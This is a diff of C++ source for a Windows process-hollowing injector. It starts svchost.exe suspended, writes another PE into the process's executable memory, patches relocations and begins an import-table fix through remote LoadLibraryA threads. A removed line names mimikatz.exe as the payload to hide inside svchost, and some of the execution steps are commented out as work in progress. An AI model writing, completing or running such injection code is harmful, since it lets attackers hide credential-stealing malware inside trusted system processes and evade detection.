@@ -3,12 +3,21 @@
 #pragma once
 #define DEBUG
 #include "ProcessHollowingPE.h"
+#include <tlhelp32.h>
+#include <psapi.h>
 
 
 bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent)
 {
 	HANDLE hPe = NULL;
 	hPe = CreateFileA(peName, GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
+	if (hPe == INVALID_HANDLE_VALUE || !hPe)
+	{
+#ifdef DEBUG
+		printf("[-] Error PE to load does not exist\r\n");
+		return FALSE;
+#endif
+	}
 	DWORD peSize = GetFileSize(hPe, NULL);
 
 #ifdef DEBUG
@@ -46,7 +55,7 @@ bool loadPEFromDisk(LPCSTR peName, LPVOID& peContent)
 
 bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi)
 {
-	
+
 	LPSTARTUPINFOA si = new STARTUPINFOA();
 	if (!CreateProcessA(processName, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi))
 	{
@@ -59,22 +68,22 @@ bool launchSusprendedProcess(LPSTR processName, LPPROCESS_INFORMATION& pi)
 
 bool retrieveNtHeaders(PIMAGE_NT_HEADERS& ntHeaders, LPVOID peContent)
 {
-    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
-    if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
-    {
+	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)peContent;
+	if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE)
+	{
 #ifdef DEBUG
-        printf("[-] ERROR: Input file seems to not be a PE\r\n");
+		printf("[-] ERROR: Input file seems to not be a PE\r\n");
 #endif
-        return FALSE;
-    }
-    ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);
+		return FALSE;
+	}
+	ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosHeaders + dosHeaders->e_lfanew);
 
 #ifdef DEBUG
-    printf("[+] Dos Header: 0x%x\r\n", dosHeaders->e_magic);
-    printf("[+] NT headers: 0x%p\r\n", ntHeaders);
+	printf("[+] Dos Header: 0x%x\r\n", dosHeaders->e_magic);
+	printf("[+] NT headers: 0x%p\r\n", ntHeaders);
 #endif
 
-    return TRUE;
+	return TRUE;
 
 }
 
@@ -91,7 +100,7 @@ bool copyPEinTargetProcess(HANDLE pHandle, LPVOID& allocAddrOnTarget, LPVOID peT
 	printf("\t[+] Headers write at : 0x%p\n", allocAddrOnTarget);
 
 	printf("[+] Writing section into target process\r\n");
-	
+
 
 	for (int i = 0; i < peInjectNtHeaders->FileHeader.NumberOfSections; i++)
 	{
@@ -159,32 +168,98 @@ bool fixRelocTable(HANDLE pHandle, PIMAGE_SECTION_HEADER peToInjectRelocSection,
 	return TRUE;
 }
 
+int listModulesOfProcess(int pid) {
 
+	HANDLE mod;
+	MODULEENTRY32 me32;
+
+	mod = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
+	if (mod == INVALID_HANDLE_VALUE) {
+		printf("CreateToolhelp32Snapshot error :(\n");
+		return -1;
+	}
+
+	me32.dwSize = sizeof(MODULEENTRY32);
+	if (!Module32First(mod, &me32)) {
+		CloseHandle(mod);
+		return -1;
+	}
+
+	printf("modules found:\n");
+	printf("name\t\t\t base address\t\t\tsize\n");
+	printf("=================================================================================\n");
+	do {
+		printf("%#25ws\t\t%#10llx\t\t%#10d\n", me32.szModule, me32.modBaseAddr, me32.modBaseSize);
+	} while (Module32Next(mod, &me32));
+	CloseHandle(mod);
+	return 0;
+}
+
+
+bool fixIAT(LPVOID pImage, PIMAGE_NT_HEADERS64 ntHeaders, HANDLE pHandle)
+{
+	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
+	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (PBYTE)pImage);
+
+#ifdef DEBUG
+	printf("[*] Get Import Directory Table at %p\r\n", importDescriptor);
+#endif
+
+	LPCSTR libName = NULL;
+	HMODULE lib = NULL;
+
+	while (importDescriptor->Name != NULL)
+	{
+		libName = (LPCSTR)(importDescriptor->Name + (DWORD_PTR)pImage);
+
+#ifdef DEBUG
+		printf("[*] library to load: %s\r\n", libName);
+		LPVOID addr = VirtualAllocEx(pHandle, (LPVOID)libName, strlen(libName) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		WriteProcessMemory(pHandle, addr, libName, strlen(libName) + 1, NULL);
+		PVOID loadlib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+		CreateRemoteThread(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadlib, addr, 0, NULL);
+
+		/*
+		* à ce niveau là il faut faire du load library en remote de toutes les libs dans un premier temps
+		* Récupérer les addresses des libs https://cocomelonc.github.io/malware/2023/09/25/malware-trick-36.html
+		* Load en local toutes les libs nécessaire, résolve les adresses avec getprocadress et récup l'offset des fonctions.
+		* Réécrire l'IAT
+		*/
+#endif
+		importDescriptor++;
+	}
+	return TRUE;
+
+}
 
 int main()
 {
-	
-	
+
+
 
 	// create destination process - this is the process to be hollowed out
 	PIMAGE_NT_HEADERS64 peInjectNtHeaders = NULL;
 	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-	
-	LPCSTR peInject = "C:\\Users\\user\\Downloads\\x64\\mimikatz.exe";
-	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";
 
-	if (!launchSusprendedProcess((LPSTR)target, pi))
-		exit(1);
+	LPCSTR peInject = "C:\\Users\\user\\source\\repos\\Test\\x64\\Release\\Test.exe";
+	LPCSTR target = "C:\\Windows\\System32\\svchost.exe";
 
 	LPVOID peToInjectContent = NULL;
 	if (!loadPEFromDisk(peInject, peToInjectContent))
 		exit(1);
-	
+
+
+	if (!launchSusprendedProcess((LPSTR)target, pi))
+		exit(1);
+
+
+
 	if (!retrieveNtHeaders(peInjectNtHeaders, peToInjectContent))
 		exit(1);
 
 	LPVOID allocAddrOnTarget = NULL;
-	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL, peInjectNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL, peInjectNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	const DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;
 
 	if (allocAddrOnTarget == NULL)
@@ -193,8 +268,8 @@ int main()
 		exit(1);
 	}
 
-	printf("[+] Memory allocate at : 0x%p\n", (LPVOID)(uintptr_t)allocAddrOnTarget);
-	
+	printf("[+] Memory allocate at : 0x%p\n", allocAddrOnTarget);
+
 	IMAGE_DATA_DIRECTORY relocationTable = peInjectNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;
 
@@ -203,9 +278,19 @@ int main()
 
 	if (!fixRelocTable(pi->hProcess, peToInjectRelocSection, allocAddrOnTarget, peToInjectContent, DeltaImageBase, relocationTable))
 		exit(1);
-	
 
-	CONTEXT CTX = {};
+	PBYTE contentOnRemote = new BYTE[12288];
+	ReadProcessMemory(pi->hProcess, allocAddrOnTarget, contentOnRemote, 12288, NULL);
+
+
+	if (!fixIAT(contentOnRemote, peInjectNtHeaders, pi->hProcess))
+		exit(1);
+
+	Sleep(3000);
+
+	listModulesOfProcess(pi->dwProcessId);
+
+	/*CONTEXT CTX = {};
 	CTX.ContextFlags = CONTEXT_FULL;
 
 	const BOOL bGetContext = GetThreadContext(pi->hThread, &CTX);
@@ -231,9 +316,9 @@ int main()
 		return FALSE;
 	}
 
-	ResumeThread(pi->hThread);
+	ResumeThread(pi->hThread);*/
 
-	return TRUE;
+
 
 	return 0;
 }
